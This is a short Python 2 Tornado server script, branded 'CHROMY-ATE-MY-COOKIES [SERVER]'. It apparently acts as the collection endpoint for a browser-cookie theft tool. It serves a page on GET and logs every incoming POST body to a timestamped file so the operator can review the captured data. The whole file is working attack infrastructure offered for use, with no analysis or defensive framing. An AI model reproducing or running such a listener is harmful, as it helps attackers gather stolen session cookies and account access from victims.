#!/usr/bin/env python

import tornado.ioloop
import tornado.web
import pprint
import datetime


def banner():
    print '''
    ===============================================
        CHROMY-ATE-MY-COOKIES   [SERVER] V.1.0.0
    ===============================================
                                            BY UN4
    '''

class MyDumpHandler(tornado.web.RequestHandler):
    def get(self):
        print "==============================================="
        print "[+] Incoming request : "
        self.render("index.html")
    def post(self):

        datetime_object = datetime.datetime.now()
        print "[+] Incoming post data > " + str(datetime_object)
        f = open("log_"+str(datetime_object).replace(" ","_")+".log", "a")
        f.write(self.request.body)
        f.close()
        print "[+] Please check this file > "+"log_"+str(datetime_object).replace(" ","_")+".log"
        print "==============================================="
if __name__ == "__main__":
    banner()
    try:
        tornado.web.Application([(r"/.*", MyDumpHandler),]).listen(5000)
        tornado.ioloop.IOLoop.instance().start()
    except Exception as e:
        print "[-] Shutdown!"
